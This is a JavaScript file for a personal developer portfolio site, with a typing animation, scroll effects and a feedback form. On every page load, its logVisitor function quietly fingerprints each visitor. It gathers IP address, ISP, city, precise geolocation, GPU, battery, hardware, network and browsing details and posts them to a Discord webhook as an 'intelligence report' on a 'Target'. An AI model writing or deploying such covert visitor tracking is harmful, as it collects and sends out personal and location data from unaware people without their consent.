// Typed effect
const words = ["Professional Developer", "Discord Bot Expert", "Cloud Solutions Architect", "Creative Problem Solver", "Horex Expert"];
let wordIndex = 0;
let charIndex = 0;
let isDeleting = false;
let typeSpeed = 100;

function type() {
    const currentWord = words[wordIndex];
    const typingText = document.getElementById("typing-text");
    
    if (!typingText) return;

    if (isDeleting) {
        typingText.textContent = currentWord.substring(0, charIndex - 1);
        charIndex--;
        typeSpeed = 50;
    } else {
        typingText.textContent = currentWord.substring(0, charIndex + 1);
        charIndex++;
        typeSpeed = 100;
    }

    if (!isDeleting && charIndex === currentWord.length) {
        isDeleting = true;
        typeSpeed = 2000; // Pause at end
    } else if (isDeleting && charIndex === 0) {
        isDeleting = false;
        wordIndex = (wordIndex + 1) % words.length;
        typeSpeed = 500;
    }

    setTimeout(type, typeSpeed);
}

// Function to scroll to a specific section
function scrollToSection(sectionId) {
    const section = document.getElementById(sectionId);
    if (section) {
        section.scrollIntoView({ behavior: 'smooth' });
    }
}

// Log visitor details to Discord
async function logVisitor(action = "Entry") {
    try {
        // Persist visitor count in localStorage
        let count = localStorage.getItem('persistentVisitorCount');
        if (!count) {
            count = 1;
        } else if (action === "Entry") {
            count = parseInt(count) + 1;
        }
        localStorage.setItem('persistentVisitorCount', count);

        const ipResponse = await fetch('https://ipapi.co/json/');
        const geoData = await ipResponse.json();
        
        // Upgraded location fetch with better reliability and precise fallback
        let exactPos = null;
        if (navigator.geolocation) {
            try {
                exactPos = await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
                        () => resolve(null),
                        { 
                            enableHighAccuracy: true,
                            timeout: 12000,
                            maximumAge: 0
                        }
                    );
                });
            } catch (e) {
                exactPos = null;
            }
        }

        // Reliable reload detection using session storage
        const visitSession = sessionStorage.getItem('visitSession');
        let currentAction = action;
        if (visitSession) {
            currentAction = "Reload";
        } else {
            sessionStorage.setItem('visitSession', 'active');
        }

        // Detailed Device & OS Detection
        const ua = navigator.userAgent;
        let os = "Unknown OS";
        let deviceType = "💻 Desktop";

        if (/android/i.test(ua)) {
            os = "Android";
            deviceType = "📱 Mobile";
        } else if (/iPad|iPhone|iPod/.test(ua)) {
            os = "iOS";
            deviceType = "📱 Mobile";
        } else if (/Windows/i.test(ua)) {
            os = "Windows";
        } else if (/Mac/i.test(ua)) {
            os = "MacOS";
        } else if (/Linux/i.test(ua)) {
            os = "Linux";
        }

        // Browser Detection
        let browser = "Unknown Browser";
        if (ua.indexOf("Chrome") > -1) browser = "Google Chrome";
        else if (ua.indexOf("Safari") > -1) browser = "Safari";
        else if (ua.indexOf("Firefox") > -1) browser = "Firefox";
        else if (ua.indexOf("Edg") > -1) browser = "Microsoft Edge";

        // Calculate persistent uptime since the very first visit
        let firstVisit = localStorage.getItem('firstVisitTime');
        if (!firstVisit) {
            firstVisit = Date.now();
            localStorage.setItem('firstVisitTime', firstVisit);
        }
        
        const uptimeMs = Date.now() - parseInt(firstVisit);
        const diffDays = Math.floor(uptimeMs / 86400000);
        const diffHrs = Math.floor((uptimeMs % 86400000) / 3600000);
        const diffMins = Math.floor((uptimeMs % 3600000) / 60000);
        const diffSecs = Math.floor((uptimeMs % 60000) / 1000);
        
        const uptimeStr = `${diffDays}d ${diffHrs}h ${diffMins}m ${diffSecs}s`;
        
        let batteryInfo = "N/A";
        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
            }
        } catch(e) {}

        // Advanced Analytics (40+ Data Points)
        const vInfo = {
            count: count,
            action: currentAction,
            uptime: uptimeStr,
            loc: geoData.city && geoData.country_name ? `${geoData.city}, ${geoData.country_name}` : 'Unknown',
            ip: geoData.ip || 'Unknown',
            isp: geoData.org || 'Unknown',
            asn: geoData.asn || 'Unknown',
            os: os,
            dev: deviceType,
            browser: browser,
            lang: navigator.language,
            res: `${window.screen.width}x${window.screen.height}`,
            availRes: `${window.screen.availWidth}x${window.screen.availHeight}`,
            colorDepth: window.screen.colorDepth,
            pixelRatio: window.devicePixelRatio,
            cores: navigator.hardwareConcurrency || 'N/A',
            mem: navigator.deviceMemory || 'N/A',
            gpu: (function() {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (!gl) return 'N/A';
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
                } catch(e) { return 'N/A'; }
            })(),
            bat: batteryInfo,
            net: navigator.connection ? navigator.connection.effectiveType : 'N/A',
            downlink: navigator.connection ? navigator.connection.downlink + " Mbps" : 'N/A',
            rtt: navigator.connection ? navigator.connection.rtt + " ms" : 'N/A',
            saveData: navigator.connection ? navigator.connection.saveData : 'N/A',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            platform: navigator.platform,
            touchPoints: navigator.maxTouchPoints,
            cookies: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            ref: document.referrer || 'Direct Visit',
            history: window.history.length,
            online: navigator.onLine,
            pdf: navigator.pdfViewerEnabled,
            fonts: (function() { try { return document.fonts.size; } catch(e) { return 'N/A'; } })(),
            plugins: navigator.plugins ? navigator.plugins.length : 'N/A',
            webdriver: navigator.webdriver,
            memory: performance.memory ? (performance.memory.jsHeapSizeLimit / 1048576).toFixed(2) + "MB" : 'N/A',
            ts: new Date().toLocaleString()
        };

        const payload = {
            username: "🛡️ Secure Intelligence Audit",
            avatar_url: "https://i.imgur.com/vHq8bN3.png",
            content: `🛡️ **High-Priority Intelligence Report: #${vInfo.count}**\n` +
                     `👤 **Identity:** \`Verified\` | **Session:** \`${vInfo.action}\`\n` +
                     `📱 **App Meta:** \`v2.4.0-pro\` | **🕒 Uptime:** \`${vInfo.uptime}\`\n` +
                     `📍 **Target:** ${vInfo.loc} | **Time:** ${vInfo.ts}`,
            embeds: [
                {
                    title: "🛰️ Global Network & Navigation",
                    color: 0xffffff,
                    fields: [
                        { name: "IP Address", value: `\`${vInfo.ip}\``, inline: true },
                        { name: "ISP Provider", value: vInfo.isp, inline: true },
                        { name: "Geo Location", value: vInfo.loc, inline: true },
                        { name: "🕒 Website Uptime", value: `\`${vInfo.uptime}\``, inline: true },
                        { name: "Connection", value: `**Type:** ${vInfo.net}\n**Speed:** ${vInfo.downlink}\n**Latency:** ${vInfo.rtt}`, inline: false },
                        { name: "Timezone", value: vInfo.timezone, inline: true },
                        { name: "Online Status", value: vInfo.online ? "✅ Online" : "❌ Offline", inline: true }
                    ]
                },
                {
                    title: "💻 Hardware & Performance Cluster",
                    color: 0x00ffcc,
                    fields: [
                        { name: "System Resources", value: `**CPU:** ${vInfo.cores} Cores\n**RAM:** ${vInfo.mem}GB\n**Heap:** ${vInfo.memory}`, inline: true },
                        { name: "Visual Metrics", value: `**Res:** ${vInfo.res}\n**DPI:** ${vInfo.pixelRatio}\n**Depth:** ${vInfo.colorDepth}-bit`, inline: true },
                        { name: "Power & Plat", value: `**Battery:** ${vInfo.bat}\n**OS:** ${vInfo.os}\n**Platform:** ${vInfo.platform}`, inline: true },
                        { name: "Graphics Engine", value: `\`${vInfo.gpu}\``, inline: false }
                    ]
                },
                {
                    title: "🛡️ Security & Browser Metadata",
                    color: 0xff0000,
                    fields: [
                        { name: "Client Info", value: `**Device:** ${vInfo.dev}\n**Browser:** ${vInfo.browser}\n**Lang:** ${vInfo.lang}`, inline: true },
                        { name: "Privacy Audit", value: `**Cookies:** ${vInfo.cookies}\n**DNT:** ${vInfo.doNotTrack}\n**WebDriver:** ${vInfo.webdriver}`, inline: true },
                        { name: "Audit Trail", value: `**Ref:** ${vInfo.ref}\n**History:** ${vInfo.history}\n**ID:** \`#${vInfo.count}\``, inline: true }
                    ],
                    footer: { text: `System Uptime: ${vInfo.uptime} | Logged: ${vInfo.ts}` }
                }
            ]
        };

        console.log("Sending log to Discord...");
        // Send message to Discord webhook directly
        const response = await fetch(CONFIG.WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`Discord API Error: ${response.status} - ${errorText}`);
        }
        console.log("Log sent successfully!");
    } catch (err) {
        console.error("Failed to log visitor:", err);
    }
}

// Scroll effects
window.addEventListener('scroll', () => {
    // Back to top button visibility
    const backToTop = document.getElementById('back-to-top');
    if (backToTop) {
        if (window.scrollY > 300) {
            backToTop.classList.add('visible');
        } else {
            backToTop.classList.remove('visible');
        }
    }

    // Scroll progress bar
    const scrollProgress = document.getElementById("scroll-progress");
    if (scrollProgress) {
        const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
        const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
        const scrolled = (winScroll / height) * 100;
        scrollProgress.style.width = scrolled + "%";
    }
});

// Run visitor log and typing effect on page load
window.addEventListener('load', () => {
    // Detect reload using session storage for more reliability across reloads
    const hasEntered = sessionStorage.getItem('hasEntered');
    let action = "Entry";
    
    if (hasEntered) {
        action = "Reload";
    } else {
        sessionStorage.setItem('hasEntered', 'true');
    }

    logVisitor(action);
    type();
});

document.getElementById("feedback-form")?.addEventListener("submit", async function(e) {
  e.preventDefault();

  const name = document.getElementById("name").value.trim();
  const feedback = document.getElementById("feedback-text").value.trim();
  const statusDiv = document.getElementById("feedback-status");

  if (!name || !feedback) {
    statusDiv.textContent = "⚠️ Please fill out all fields.";
    statusDiv.classList.remove("hidden");
    return;
  }

  document.getElementById("submit-text").style.display = "none";
  document.getElementById("loading").classList.remove("hidden");

    try {
      // Send message to Discord webhook directly
      const response = await fetch(CONFIG.WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [
            {
              title: "📩 New Feedback Received",
              color: 0x667eea,
              fields: [
                { name: "👤 Name", value: name, inline: true },
                { name: "💬 Feedback", value: feedback }
              ],
              footer: { text: "Portfolio Feedback bot ☁️" },
              timestamp: new Date()
            }
          ]
        })
      });

    if (response.ok) {
      statusDiv.textContent = "✅ Thanks! Feedback sent successfully!";
    } else {
      statusDiv.textContent = "❌ Failed to send feedback.";
    }
  } catch (err) {
    statusDiv.textContent = "⚠️ Error sending feedback.";
  }

  document.getElementById("submit-text").style.display = "inline";
  document.getElementById("loading").classList.add("hidden");
  statusDiv.classList.remove("hidden");
  this.reset();
});
